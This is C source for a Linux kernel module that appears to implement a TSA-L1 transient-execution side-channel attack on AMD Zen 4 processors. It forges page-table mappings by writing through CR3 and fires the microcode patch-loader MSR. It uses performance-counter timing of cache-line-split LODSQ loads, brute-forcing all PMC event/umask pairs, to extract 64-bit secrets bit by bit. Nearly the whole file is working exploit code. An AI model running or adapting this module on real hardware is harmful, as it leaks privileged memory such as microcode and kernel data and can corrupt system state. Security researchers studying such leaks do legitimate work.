/*
 * tsa.c
 *
 *   Extraction Kernel Module with Manual Page Table Manipulation.
 * - Executes in Ring-0, pinned to Core 0.
 * - Uses direct CR3/PML5 manipulation to forge virtual-to-physical mappings.
 * - Cache-Line Split amplification via LODSQ.
 * - Phase 1: Iterates through known golden PMC candidates.
 * - Phase 2: Brute-forces all PMC event/umask combinations (0x00-0xFF).
 * - A-B-B-A Swapped execution order to prevent pipeline warm-up bias.
 * - Otsu thresholding + majority vote.
 */

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/kthread.h>
#include <linux/delay.h>
#include <linux/sort.h>
#include <linux/gfp.h>
#include <linux/mm.h>
#include <linux/vmalloc.h>
#include <linux/sched.h>     /* Required for cond_resched() */
#include <linux/irqflags.h>  /* Required for local_irq_save() */
#include <linux/string.h>
#include <asm/processor.h>
#include <asm/pgtable.h>
#include <asm/page.h>
#include <asm/io.h>
#include <asm/fpu/api.h>     /* Required for kernel_fpu_begin() / end() */
#include <asm/msr.h>         /* Required for wrmsrl and rdmsr */
#include <linux/firmware.h>

#include "opcode_wrapper.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("TSA Researcher");
MODULE_DESCRIPTION("Kernel module for scanning and extracting from Zen 4 PMCs using TSA-L1 techniques.");

/* ------------------------------------------------------------------ */
/* Zen 4 Performance Counter Configuration                            */
/* ------------------------------------------------------------------ */
#define MSR_ZEN4_PERF_CTL0 0xC0010200
#define MSR_ZEN4_PERF_CTR0 0xC0010201

#define MAX_EVENT_ID 0xFF
#define MAX_UMASK_ID 0xFF

struct pmc_candidate {
    int event;
    int umask;
};

/* ------------------------------------------------------------------ */
/* Configuration (Fill in your target VAs here)                       */
/* ------------------------------------------------------------------ */
#define BASE_VA      0xFF00000000000000ull

#define PAGE_OFFSET_CACHED 0xb20 //start of microcode patch data within the page, which is cached and can be used for the attack

static uint64_t PHYS_BASE = 0;
static uint64_t VICTIM_VA = 0;
static uint64_t ATTACK_VA = 0;
static uint64_t SECRET_VALUE = 0;

#define CHASE_VA     (BASE_VA + 0x0000700000002000ULL)


#define PHYS_RESERVED_BASE 0x300000000ULL

#define MAP_SIZE           4096
#define N_SECRET_BITS      64
#define SWEEP_PROBES       500

/* ------------------------------------------------------------------ */
/* User-Provided Page Table Manipulation Snippet                      */
/* ------------------------------------------------------------------ */
#define PAGE_PRESENT 0x1
#define PAGE_RW 0x2
#define PAGE_USER 0x4
#define PAGE_SIZE_4K 4096

static inline unsigned long read_cr3(void) {
    unsigned long cr3;
    asm volatile("mov %%cr3, %0" : "=r"(cr3));
    return cr3;
}

static void map_physical_to_virtual(unsigned long phys_addr, unsigned long virt_addr, u64 addtional_pte_flags) {
    unsigned long *pml5, *pml4, *pdp, *pd, *pt;
    unsigned long index5, index4, index3, index2, index1;

    pml5 = (unsigned long *)__va(read_cr3() & ~0xFFFull);

    index5 = (virt_addr >> 48) & 0x1FF;
    index4 = (virt_addr >> 39) & 0x1FF;
    index3 = (virt_addr >> 30) & 0x1FF;
    index2 = (virt_addr >> 21) & 0x1FF;
    index1 = (virt_addr >> 12) & 0x1FF;

    if (!pml5[index5]) {
        pml5[index5] = __pa(__get_free_page(GFP_KERNEL)) | PAGE_PRESENT | PAGE_RW;
    }
    pml4 = (unsigned long *)__va(pml5[index5] & PAGE_MASK);
    if (!pml4[index4]) {
        pml4[index4] = __pa(__get_free_page(GFP_KERNEL)) | PAGE_PRESENT | PAGE_RW;
    }
    pdp = (unsigned long *)__va(pml4[index4] & PAGE_MASK);
    if (!pdp[index3]) {
        pdp[index3] = __pa(__get_free_page(GFP_KERNEL)) | PAGE_PRESENT | PAGE_RW;
    }
    pd = (unsigned long *)__va(pdp[index3] & PAGE_MASK);
    if (!pd[index2]) {
        pd[index2] = __pa(__get_free_page(GFP_KERNEL)) | PAGE_PRESENT | PAGE_RW;
    }
    pt = (unsigned long *)__va(pd[index2] & PAGE_MASK);
    if (!pt[index1]) {
        pt[index1] = (phys_addr & PAGE_MASK) | PAGE_PRESENT | PAGE_RW | addtional_pte_flags;
    } else {
        pt[index1] = (phys_addr & PAGE_MASK) | PAGE_PRESENT | PAGE_RW | addtional_pte_flags;
    }


    smp_wmb();
    asm volatile("invlpg (%0)" ::"r"(virt_addr) : "memory");
}

/* ------------------------------------------------------------------ */
/* Low-level CPU primitives                                           */
/* ------------------------------------------------------------------ */
static inline void mfence_lfence(void) {
    __asm__ volatile("mfence\nlfence" : : : "memory");
}

static inline void flush_l1d(void)
{
    uint32_t lo = 1;
    uint32_t hi = 0;

    asm volatile(
        "wrmsr\n\t"
        "mfence\n\t"
        "lfence\n\t"
        :
        : "c"(0x10b), "a"(lo), "d"(hi)
        : "memory");
}


/* ------------------------------------------------------------------ */
/* Patch-Loader                                                       */
/* ------------------------------------------------------------------ */
#define MSR_AMD64_PATCH_LEVEL 0x0000008B
#define MSR_AMD64_PATCH_LOADER 0xC0010020

#define UCODE_MAGIC 0x00414d44 /* "AMD\0" little-endian */
#define UCODE_EQUIV_CPU_TABLE 0x00000000
#define UCODE_UCODE_TYPE 0x00000001

#define CONTAINER_HDR_SIZE 12
#define SECTION_HDR_SIZE 8

struct equiv_cpu_entry
{
    u32 installed_cpu;
    u32 fixed_errata_mask;
    u32 fixed_errata_compare;
    u16 equiv_cpu;
    u16 res;
} __packed;

struct microcode_header_amd
{
    u32 data_code;
    u32 patch_id;
    u16 mc_patch_data_id;
    u8 mc_patch_data_len;
    u8 init_flag;
    u32 mc_patch_data_checksum;
    u32 nb_dev_id;
    u32 sb_dev_id;
    u16 processor_rev_id;
    u8 nb_rev_id;
    u8 sb_rev_id;
    u8 bios_api_rev;
    u8 reserved1[3];
    u32 match_reg[8];
} __packed;

struct microcode_amd
{
    struct microcode_header_amd hdr;
    unsigned int mpb[];
} __packed;

struct selected_patch
{
    struct microcode_amd *mc;
    u32 patch_size;
};

static u32 my_cpuid_1_eax(void)
{
    u32 eax, ebx, ecx, edx;

    eax = 1;
    cpuid(eax, &eax, &ebx, &ecx, &edx);

    return eax;
}

static u32 amd_patch_id_to_cpuid_eax(u32 patch_id)
{
    u32 stepping;
    u32 model;
    u32 ext_model;
    u32 ext_fam;
    u32 eax = 0;

    /*
     * Linux uses patch_id encoding for Zen and newer:
     *
     * patch_id bits:
     *   [11:8]   stepping
     *   [15:12]  model
     *   [23:20]  ext_model
     *   [31:24]  ext_fam
     *
     * CPUID(1).EAX bits:
     *   [3:0]    stepping
     *   [7:4]    model
     *   [11:8]   base family, 0xf for extended AMD family
     *   [19:16]  ext_model
     *   [27:20]  ext_fam
     */

    stepping = (patch_id >> 8) & 0xf;
    model = (patch_id >> 12) & 0xf;
    ext_model = (patch_id >> 20) & 0xf;
    ext_fam = (patch_id >> 24) & 0xff;

    eax |= stepping;
    eax |= model << 4;
    eax |= 0xf << 8;
    eax |= ext_model << 16;
    eax |= ext_fam << 20;

    return eax;
}

static u32 get_patch_level(void)
{
    u32 lo, hi;

    rdmsr(MSR_AMD64_PATCH_LEVEL, lo, hi);
    return lo;
}

static bool verify_container(const u8 *buf, size_t size)
{
    const u32 *hdr = (const u32 *)buf;

    if (size < CONTAINER_HDR_SIZE)
        return false;

    if (hdr[0] != UCODE_MAGIC)
        return false;

    return true;
}

static struct microcode_amd *find_matching_zen_patch(const u8 *data,
                                                     size_t size,
                                                     u32 cpuid_eax,
                                                     u32 *patch_size_out)
{
    const u8 *p = data;
    size_t left = size;

    while (left >= CONTAINER_HDR_SIZE)
    {
        const u32 *container_hdr = (const u32 *)p;
        u32 magic;
        u32 first_type;
        u32 first_size;
        const u8 *q;
        size_t qleft;

        magic = container_hdr[0];
        first_type = container_hdr[1];
        first_size = container_hdr[2];

        if (magic != UCODE_MAGIC)
        {
            pr_err("bad AMD microcode container magic: 0x%08x\n", magic);
            return NULL;
        }

        if (left < CONTAINER_HDR_SIZE + first_size)
        {
            pr_err("truncated first section\n");
            return NULL;
        }

        /*
         * For fam17h/19h/1Ah Linux does not need the equivalence table
         * for matching, but the container still has a first section.
         * Skip it, then scan ucode patch sections.
         */
        q = p + CONTAINER_HDR_SIZE + first_size;
        qleft = left - CONTAINER_HDR_SIZE - first_size;

        while (qleft >= SECTION_HDR_SIZE)
        {
            const u32 *sec = (const u32 *)q;
            u32 sec_type = sec[0];
            u32 sec_size = sec[1];
            struct microcode_amd *mc;
            u32 patch_cpuid;

            if (sec_type != UCODE_UCODE_TYPE)
            {
                /*
                 * Probably start of another glued container or unknown section.
                 * Stop this container scan.
                 */
                break;
            }

            if (sec_size < sizeof(struct microcode_header_amd))
            {
                pr_err("patch section too small: %u\n", sec_size);
                return NULL;
            }

            if (qleft < SECTION_HDR_SIZE + sec_size)
            {
                pr_err("truncated patch section\n");
                return NULL;
            }

            mc = (struct microcode_amd *)(q + SECTION_HDR_SIZE);

            if (mc->hdr.nb_dev_id || mc->hdr.sb_dev_id)
            {
                pr_info("skip chipset-specific patch 0x%08x\n",
                        mc->hdr.patch_id);
                goto next_patch;
            }

            patch_cpuid = amd_patch_id_to_cpuid_eax(mc->hdr.patch_id);

            pr_info("candidate patch_id=0x%08x patch_cpuid=0x%08x size=%u\n",
                    mc->hdr.patch_id, patch_cpuid, sec_size);

            if (patch_cpuid == cpuid_eax)
            {
                *patch_size_out = sec_size;
                return mc;
            }

        next_patch:
            q += SECTION_HDR_SIZE + sec_size;
            qleft -= SECTION_HDR_SIZE + sec_size;
        }

        /*
         * If there are multiple AMD containers glued together, try to advance.
         * This is intentionally conservative.
         */
        if (qleft == left)
            break;

        if (qleft == 0)
            break;

        p = q;
        left = qleft;
    }

    return NULL;
}

static const struct firmware *fw;
struct opcode_result out;
struct microcode_amd *mc;



/* ------------------------------------------------------------------ */
/* Gadget — Cache-Line Split Latency                                  */
/* ------------------------------------------------------------------ */

static noinline __aligned(4096) uint64_t probe_D2(volatile uint8_t *victim,
                                                   volatile uint8_t *target,
                                                   uint64_t bit_idx,
                                                   volatile uint64_t *chase_head)
{
    uint64_t elapsed;
    unsigned long flags;

    local_irq_save(flags);

    asm volatile("sfence" ::: "memory");
    __asm__ volatile("movq (%0),%%rax\n\t"
                     "lfence\n\t" :: "r"(chase_head) : "rax", "memory");
    __asm__ volatile("movq (%0),%%rax\n\t"
                     "lfence\n\t" :: "r"(chase_head + 128) : "rax", "memory");

    asm volatile("invlpg (%0)" :: "r"(target) : "memory");
    flush_l1d();
    mfence_lfence();
    mfence_lfence();

    if (victim) {
        __asm__ volatile("movq (%0),%%rax" :: "r"(victim) : "rax", "memory");
    } else {
        run_selected_opcode(OP_WRMSR, MSR_AMD64_PATCH_LOADER, &mc->hdr.data_code, &out);
    }

    __asm__ volatile(
        "movl $0xC0010201, %%ecx\n\t"
        "lfence\n\t"
        "rdmsr\n\t"
        "lfence\n\t"

        "movq %%rax,%%r8\n\t"
        "movq %%rdx,%%r11\n\t"

        "movb %b[bit], %%cl\n\t"

        "movq (%[tgt]), %%r9\n\t"
        "shrq %%cl, %%r9\n\t"
        "andq $1, %%r9\n\t"

        /* AMPLIFICATION: Conditional Cache-Line Split via LODSQ */
        "movq %[chase], %%r10\n\t"
        "addq $56, %%r10\n\t"

        ".rept 20\n\t"
        "movq %%r10, %%rsi\n\t"
        "addq %%r9, %%rsi\n\t"
        "lodsq\n\t"
        ".endr\n\t"

        "movl $0xC0010201, %%ecx\n\t"
        "lfence\n\t"
        "rdmsr\n\t"
        "lfence\n\t"

        "shlq $32,%%r11\n\t"
        "orq %%r11,%%r8\n\t"

        "shlq $32,%%rdx\n\t"
        "orq %%rdx,%%rax\n\t"
        "subq %%r8,%%rax\n\t"

        : "=&a"(elapsed)
        : [tgt] "r"(target),
          [bit] "r"(bit_idx),
          [chase] "r"(chase_head)
        : "rcx", "rdx", "rsi", "r8", "r9", "r10", "r11", "r12", "r13", "memory");

    local_irq_restore(flags);
    return elapsed;
}

/* ------------------------------------------------------------------ */
/* Calibration and Classification Types                               */
/* ------------------------------------------------------------------ */

typedef struct {
    uint64_t threshold;
    uint64_t mean0;
    uint64_t mean1;
    int one_is_high;
} calib_t;

typedef struct {
    int pred_bit;
    int high_votes;
    int low_votes;
    uint64_t avg;
} bit_res_t;

static int cmp_u64(const void *a, const void *b)
{
    uint64_t va = *(const uint64_t *)a;
    uint64_t vb = *(const uint64_t *)b;

    if (va > vb)
        return 1;
    if (va < vb)
        return -1;
    return 0;
}

static uint64_t avg_u64_array(uint64_t *arr, int n)
{
    uint64_t sum = 0;
    int i;

    if (!arr || n <= 0)
        return 0;

    for (i = 0; i < n; i++)
        sum += arr[i];

    return sum / n;
}

/* ------------------------------------------------------------------ */
/* Kernel Filter Engine with Otsu Thresholding                        */
/* ------------------------------------------------------------------ */

/*
 * Otsu threshold over the combined calibration timing distribution.
 *
 * This avoids building a huge sparse histogram. Instead:
 *   1. combine all timing samples,
 *   2. sort them,
 *   3. test every split between distinct values,
 *   4. choose the split with maximum between-class variance.
 */
static uint64_t otsu_threshold_two_arrays(uint64_t *a, int na,
                                          uint64_t *b, int nb)
{
    uint64_t total_sum = 0;
    uint64_t prefix_sum = 0;
    uint64_t best_threshold = 0;

    unsigned __int128 best_num = 0;
    unsigned __int128 best_den = 1;

    int n = na + nb;
    int ia = 0;
    int ib = 0;
    int k;

    uint64_t prev_val = 0;
    uint64_t cur_val = 0;
    uint64_t next_val = 0;

    if (!a || !b || na <= 0 || nb <= 0)
        return 0;

    /*
     * Sort calibration arrays in place.
     *
     * This destroys the original order, but that is fine because Otsu only
     * needs the distribution, not the temporal ordering.
     */
    sort(a, na, sizeof(uint64_t), cmp_u64, NULL);
    sort(b, nb, sizeof(uint64_t), cmp_u64, NULL);

    for (k = 0; k < na; k++)
        total_sum += a[k];

    for (k = 0; k < nb; k++)
        total_sum += b[k];

    /*
     * Default fallback threshold.
     */
    if (a[na / 2] < b[nb / 2])
        best_threshold = (a[na / 2] + b[nb / 2]) / 2;
    else
        best_threshold = (b[nb / 2] + a[na / 2]) / 2;

    /*
     * Walk the two sorted arrays as if they were one merged sorted array.
     */
    ia = 0;
    ib = 0;

    for (k = 0; k < n - 1; k++) {
        uint64_t w0;
        uint64_t w1;
        int64_t diff_signed;
        unsigned __int128 diff;
        unsigned __int128 num;
        unsigned __int128 den;
        unsigned __int128 lhs;
        unsigned __int128 rhs;

        /*
         * Pop current smallest value.
         */
        if (ia < na && (ib >= nb || a[ia] <= b[ib])) {
            cur_val = a[ia++];
        } else {
            cur_val = b[ib++];
        }

        prefix_sum += cur_val;

        /*
         * Peek next smallest value without consuming it.
         */
        if (ia < na && (ib >= nb || a[ia] <= b[ib])) {
            next_val = a[ia];
        } else if (ib < nb) {
            next_val = b[ib];
        } else {
            break;
        }

        /*
         * Otsu split only makes sense between distinct values.
         */
        if (cur_val == next_val) {
            prev_val = cur_val;
            continue;
        }

        w0 = k + 1;
        w1 = n - w0;

        if (w0 == 0 || w1 == 0) {
            prev_val = cur_val;
            continue;
        }

        /*
         * diff = total_sum * w0 - prefix_sum * n
         *
         * Use 128-bit only for multiplication/comparison.
         * No 128-bit division is used, so no __udivti3 / __divti3.
         */
        diff_signed = (int64_t)(total_sum * w0 - prefix_sum * n);

        if (diff_signed < 0)
            diff = (unsigned __int128)(-diff_signed);
        else
            diff = (unsigned __int128)diff_signed;

        num = diff * diff;
        den = (unsigned __int128)w0 * w1;

        /*
         * Compare:
         *
         *   num / den > best_num / best_den
         *
         * as:
         *
         *   num * best_den > best_num * den
         */
        lhs = num * best_den;
        rhs = best_num * den;

        if (lhs > rhs) {
            best_num = num;
            best_den = den;
            best_threshold = (cur_val + next_val) / 2;
        }

        prev_val = cur_val;
    }

    return best_threshold;
}

/*
 * Majority-vote classifier.
 *
 * timing <= threshold => low cluster
 * timing >  threshold => high cluster
 */
static bit_res_t classify_samples_otsu(uint64_t *times,
                                       int count,
                                       const calib_t *cal)
{
    bit_res_t res = {0};
    uint64_t sum = 0;
    int i;

    if (!times || !cal || count <= 0)
        return res;

    for (i = 0; i < count; i++) {
        sum += times[i];

        if (times[i] > cal->threshold)
            res.high_votes++;
        else
            res.low_votes++;
    }

    res.avg = sum / count;

    if (cal->one_is_high) {
        res.pred_bit = (res.high_votes > res.low_votes) ? 1 : 0;
    } else {
        res.pred_bit = (res.low_votes > res.high_votes) ? 1 : 0;
    }

    return res;
}


/* ------------------------------------------------------------------ */
/* Sweep Logic & Otsu Calibration                                     */
/* ------------------------------------------------------------------ */
static void fast_measure_interleaved_swapped(volatile uint8_t *victim,
                                             volatile uint8_t *target,
                                             volatile uint64_t *chase,
                                             uint64_t *times0,
                                             uint64_t *times1)
{
    int i;

    for (i = 0; i < SWEEP_PROBES; i += 2) {
        *(volatile uint32_t *)victim = 0;
        mfence_lfence();
        times0[i] = probe_D2(victim, target, 3, chase);

        *(volatile uint32_t *)victim = 0xffffffff;
        mfence_lfence();
        times1[i] = probe_D2(victim, target, 3, chase);

        if (i + 1 < SWEEP_PROBES) {
            *(volatile uint32_t *)victim = 0xffffffff;
            mfence_lfence();
            times1[i + 1] = probe_D2(victim, target, 3, chase);

            *(volatile uint32_t *)victim = 0;
            mfence_lfence();
            times0[i + 1] = probe_D2(victim, target, 3, chase);
        }
    }
}

static calib_t run_test_case(volatile uint8_t *victim,
                             volatile uint8_t *target,
                             volatile uint64_t *chase,
                             uint64_t *times0,
                             uint64_t *times1)
{
    calib_t cal = {0};

    if (!times0 || !times1) {
        pr_err("vmalloc failed\n");
        return cal;
    }

    fast_measure_interleaved_swapped(victim, target, chase, times0, times1);

    cal.mean0 = avg_u64_array(times0, SWEEP_PROBES);
    cal.mean1 = avg_u64_array(times1, SWEEP_PROBES);

    cal.threshold = otsu_threshold_two_arrays(times0, SWEEP_PROBES,
                                              times1, SWEEP_PROBES);

    /*
     * Orientation:
     *
     * If calibration value 1 gives higher average timing, high cluster means bit 1.
     * Otherwise low cluster means bit 1.
     */
    cal.one_is_high = (cal.mean1 > cal.mean0) ? 1 : 0;

    return cal;
}

/* ------------------------------------------------------------------ */
/* Extraction Logic using Otsu + Majority Vote                        */
/* ------------------------------------------------------------------ */
static bit_res_t measure_single_bit_otsu(volatile uint8_t *victim,
                                         volatile uint8_t *target,
                                         uint64_t bit_idx,
                                         volatile uint64_t *chase,
                                         uint64_t *times,
                                         const calib_t *cal)
{
    for (int i = 0; i < SWEEP_PROBES; i++) {
        times[i] = probe_D2(victim, target, bit_idx, chase);
    }

    return classify_samples_otsu(times, SWEEP_PROBES, cal);
}

static int run_extraction(volatile uint8_t *victim,
                          volatile uint8_t *target,
                          volatile uint64_t *chase,
                          const calib_t *cal,
                          uint64_t *times)
{
    uint64_t secret = SECRET_VALUE;
    int b, correct = 0;
    uint64_t predicted_word = 0;

    for (b = 0; b < N_SECRET_BITS; b++) {
        int true_bit = (secret >> b) & 1;
        bit_res_t res;

        res = measure_single_bit_otsu(victim, target, b, chase, times, cal);

        if (res.pred_bit == true_bit)
            correct++;

        if (res.pred_bit)
            predicted_word |= (1ULL << b);

    }

    if(predicted_word != 0x0 && predicted_word != 0xffffffffffffffff)
        pr_info("[+] Predicted: 0x%016llx \n", (unsigned long long)predicted_word);

    return correct;
}

#define BYTES_PER_LINE 16
static void __maybe_unused hexdump(const void *addr, size_t len)
{
    const unsigned char *ptr = addr;
    size_t i, j;

    for (i = 0; i < len; i += BYTES_PER_LINE)
    {
        printk(KERN_INFO "%08lx: ", (unsigned long)(ptr + i));
        for (j = 0; j < BYTES_PER_LINE; j++)
        {
            if (i + j < len)
                printk(KERN_CONT "%02x ", ptr[i + j]);
            else
                printk(KERN_CONT "   ");
        }

        printk(KERN_CONT " | \n");
    }
}


static int kthread_tsa_main(void *data)
{
    
    pr_info("============================================================\n");
    pr_info("  TSA-L1 Kernel Extractor: BRUTE FORCE PMC SWEEP\n");
    pr_info("  Filtering: Otsu threshold + majority vote\n");
    pr_info("============================================================\n");
    
    u32 cpuid_eax;
    u32 patch_size = 0;

    cpuid_eax = my_cpuid_1_eax();
    pr_info("CPUID(1).EAX = 0x%08x current_patch_level=0x%08x\n",
            cpuid_eax, get_patch_level());

    pr_info("firmware virtual address: %px size=%zu\n", fw->data, fw->size);

    if (!verify_container(fw->data, fw->size))
    {
        pr_err("not a valid AMD microcode container\n");
        return -1;
    }

    mc = find_matching_zen_patch(fw->data, fw->size,
                                 cpuid_eax, &patch_size);
    if (!mc)
    {
        pr_err("no matching Zen/Zen4 patch found\n");
        return -1;
    }

    pr_info("selected patch_id=0x%08x processor_rev_id=0x%04x patch_addr=%px patch_size=%u\n",
            mc->hdr.patch_id,
            mc->hdr.processor_rev_id,
            &mc->hdr.data_code,
            patch_size);
    
    
    hexdump((u8 *)mc + sizeof(struct microcode_header_amd), 196);

    volatile uint8_t *victim = (volatile uint8_t *)VICTIM_VA;
    volatile uint8_t *attack = (volatile uint8_t *)ATTACK_VA;
    volatile uint8_t *chase_region = (volatile uint8_t *)CHASE_VA;
    volatile uint64_t *chase1, *chase2;
    int evt, umask, correct;
    calib_t attack_cal;
    uint64_t *times0;
    uint64_t *times1;
    int count = 0;


    pr_info("[+] Mapping Virtual Addresses to Physical Base: 0x%llx\n",
            (unsigned long long)PHYS_RESERVED_BASE);

    map_physical_to_virtual(PHYS_RESERVED_BASE, VICTIM_VA, 0);
    map_physical_to_virtual(PHYS_RESERVED_BASE + 0x200000, ATTACK_VA, 0);
    map_physical_to_virtual(PHYS_RESERVED_BASE + 0x800000, CHASE_VA, 0);
    map_physical_to_virtual(PHYS_RESERVED_BASE + 0x801000, CHASE_VA + MAP_SIZE, 0);

    memset((void *)attack, 0xFF, MAP_SIZE);

    chase1 = (uint64_t *)chase_region;
    chase2 = (uint64_t *)(chase_region + MAP_SIZE);

    *chase1 = (uint64_t)chase2;
    *chase2 = (uint64_t)chase1;

    times0 = vmalloc(SWEEP_PROBES * sizeof(uint64_t));
    times1 = vmalloc(SWEEP_PROBES * sizeof(uint64_t));

    if (!times0 || !times1) {
        pr_err("[-] Vmalloc failed. Aborting.\n");
        if (times0)
            vfree(times0);
        if (times1)
            vfree(times1);
        return -1;
    }

    pr_info("\n[+] COMMENCING BRUTE FORCE ITERATION (Events 0x00-0xFF, Umasks 0x00-0xFF)\n");
    pr_info("    Target Accuracy: > 56 / 64 bits\n");
    pr_info("    --------------------------------------------------------------\n");

    for (evt = 0x01; evt < MAX_EVENT_ID; evt++) {
        if ((evt % 16) == 0)
            pr_info("[*] Sweeping Event Base 0x%02X...\n", evt);

        
        for (umask = 0x0; umask < MAX_UMASK_ID; umask++) {
            uint64_t config;
            config = (1ULL << 22)
                   | (1ULL << 17)
                   | (1ULL << 16)
                   | ((uint64_t)umask << 8)
                   | (uint64_t)evt;


            wrmsrl(MSR_ZEN4_PERF_CTL0, 0ULL);
            wrmsrl(MSR_ZEN4_PERF_CTR0, 0ULL);
            wrmsrl(MSR_ZEN4_PERF_CTL0, config);

            attack_cal = run_test_case(victim, attack, chase1, times0, times1);

            if (attack_cal.threshold != 0 && attack_cal.mean0 != attack_cal.mean1) {
                correct = run_extraction(0, attack + PAGE_OFFSET_CACHED, chase1, &attack_cal, times0);

                if (0) {
                    pr_info("[+] VALID PMC FOUND: [E: 0x%02X | U: 0x%02X] -> Accuracy: %d / 64 bits | threshold=%llu mean0=%llu mean1=%llu one_is_high=%d\n",
                            evt,
                            umask,
                            correct,
                            (unsigned long long)attack_cal.threshold,
                            (unsigned long long)attack_cal.mean0,
                            (unsigned long long)attack_cal.mean1,
                            attack_cal.one_is_high);
                    count++;
                }
            }

        }

        cond_resched();
    }

    pr_info("\n[+] Brute Force Sweep Found %d Valid PMCs.\n", count);

    vfree(times0);
    vfree(times1);

    wrmsrl(MSR_ZEN4_PERF_CTL0, 0ULL);

    pr_info("\n[+] PMC Brute Force Sweep Complete.\n");
    return 0;
}

/* ------------------------------------------------------------------ */
/* Main Kernel Thread Wrapper                                         */
/* ------------------------------------------------------------------ */
static struct task_struct *tsa_thread;

static int __init tsa_init(void) {
    pr_info("TSA-L1 Module Loaded.\n");

    int ret = request_firmware(&fw, "amd-ucode/microcode_amd_fam19h.bin", NULL);
    if (ret)
    {
        pr_err("request_firmware failed: %d\n", ret);
        return ret;
    }

    tsa_thread = kthread_create(kthread_tsa_main, NULL, "tsa_worker");

    uint64_t mask =
        (1ULL << 13) | (1ULL << 26) |   // u1
        (1ULL << 14) | (1ULL << 25);    // u2


    PHYS_BASE = 0x000ffffdf7002000;
    SECRET_VALUE = 0x0;

    VICTIM_VA = BASE_VA + PHYS_BASE;
    ATTACK_VA = BASE_VA + PHYS_BASE ^ mask;

    pr_info("    [*] Reserved Physical Base: 0x%llx\n", PHYS_BASE);
    pr_info("    [*] Mapped Victim VA: 0x%llx\n", VICTIM_VA);
    pr_info("    [*] Mapped Attack VA: 0x%llx\n", ATTACK_VA);
    pr_info("    [*] Secret Value: 0x%016llx\n", SECRET_VALUE);

    if (IS_ERR(tsa_thread)) {
        pr_err("Failed to create kthread.\n");
        return PTR_ERR(tsa_thread);
    }

    kthread_bind(tsa_thread, 0);
    wake_up_process(tsa_thread);
    return 0;
}

static void __exit tsa_exit(void)
{
    pr_info("TSA-L1 Module Unloaded.\n");
    if (fw) {
        release_firmware(fw);
        fw = NULL;
    }
}

module_init(tsa_init);
module_exit(tsa_exit);